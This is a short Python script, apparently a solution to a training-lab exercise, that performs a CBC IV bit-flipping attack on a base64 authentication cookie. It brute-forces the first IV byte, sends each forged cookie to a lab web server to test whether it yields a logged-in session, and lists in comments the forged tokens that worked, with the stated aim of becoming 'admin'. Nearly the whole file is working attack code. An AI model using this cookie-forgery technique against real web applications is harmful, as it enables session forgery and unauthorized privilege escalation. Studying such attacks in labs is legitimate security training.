# CBC Mode of operation, tackling a situation where this can fail

import base64
import requests
from urllib.parse import quote


def check_cookie(token) -> bool:
    URL = "http://ptl-a531be76-5ed7283e.libcurl.so/"
    res = requests.get(URL, cookies={"auth": token})
    if "You are currently logged in as" in res.text:
        print("Cookie is fine.")
        return True
    else:
        print("Error: Cookie is not fine. Please re-login.")
        return False


token1 = "7yqBk7P63wQi/gp7DHp+PM0Lqv+72POP"
dToken1 = base64.b64decode(token1)
iv = dToken1[0:8]
remainingToken = dToken1[8 : len(dToken1)]

if check_cookie(quote(token1)):
    print("Initial Cookie is fine. Proceeding...")
else:
    print("Intial Cookie is NOT fine. Please Re-login.")

print("Status: Brute-forcing iv to gete 'admin'")

byte_array = bytes(range(256))

for byte in byte_array:
    iv = bytes([byte]) + iv[1 : len(dToken1)]
    modifiedToken = iv + remainingToken
    finalToken = quote(base64.b64encode(modifiedToken))
    print("[-] Modified Token :: {}".format(quote(base64.b64encode(modifiedToken))))
    print("[-] Original Token :: {}".format(quote(base64.b64encode(dToken1))))

    print(check_cookie(finalToken))


# valid tokens found after running this script ::
# TiqBk7P63wQi/gp7DHp%2BPM0Lqv%2B72POP
# TCqBk7P63wQi/gp7DHp%2BPM0Lqv%2B72POP
# biqBk7P63wQi/gp7DHp%2BPM0Lqv%2B72POP
# byqBk7P63wQi/gp7DHp%2BPM0Lqv%2B72POP
